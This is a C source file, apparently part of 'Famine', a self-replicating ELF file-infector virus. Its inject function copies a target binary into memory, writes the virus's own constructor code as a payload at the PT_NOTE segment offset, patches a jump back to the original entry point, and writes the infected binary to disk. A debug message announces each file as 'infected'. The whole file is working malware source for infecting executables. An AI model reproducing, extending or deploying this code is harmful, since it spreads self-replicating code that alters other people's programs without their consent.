#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static void write_on_memory(const struct s_info *info, char *ptr)
{
	size_t index = 0;
	char *dst = ptr;
	char *src = info->ptr;
	
	while (index < info->data->p_offset + info->data->p_filesz)
	{
		*dst++ = *src++;
		index++;
	}
	while (index < info->note->p_offset)
	{
		*dst++ = 0;
		index++;
	}
	while (index < info->note->p_offset + PAYLOAD_SIZE)
	{
		*dst++ = 0;
		index++;
	}
}

static void replicate_on_memory(const struct s_info *info, char *ptr)
{
	char *dst;
	uint8_t *src;
	const Elf64_Addr entry_point = info->old_entry - (info->new_entry) - JMP_OFFSET;

	dst = ptr + info->note->p_offset;
	src = (uint8_t *)&constructor;

	for (size_t index = 0; index < PAYLOAD_SIZE; index++)
		*dst++ = *src++;

	_memcpy(ptr + info->note->p_offset + (JMP_OFFSET - sizeof(JMP_OPCODE)), &entry_point, sizeof(int32_t));
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void inject(const struct s_info *info, const size_t m_entry)
{
	char *ptr;

	if ((ptr = _mmap(NULL, info->note->p_offset + PAYLOAD_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return ;

	write_on_memory(info, ptr);
	replicate_on_memory(info, ptr);

	_write(info->fd, ptr, info->note->p_offset + PAYLOAD_SIZE);
	_munmap(ptr, info->note->p_offset + PAYLOAD_SIZE);


#if DEBUG
	(void)m_entry;

	char fam[] = "\033[0;32mFamine\033[0m: ";
	char des[] = " has been infected\n\n";

	_write(1, fam, _strlen(fam)); 
	_write(1, info->name, _strlen(info->name));
	_write(1, des, _strlen(des)); 
#endif
}
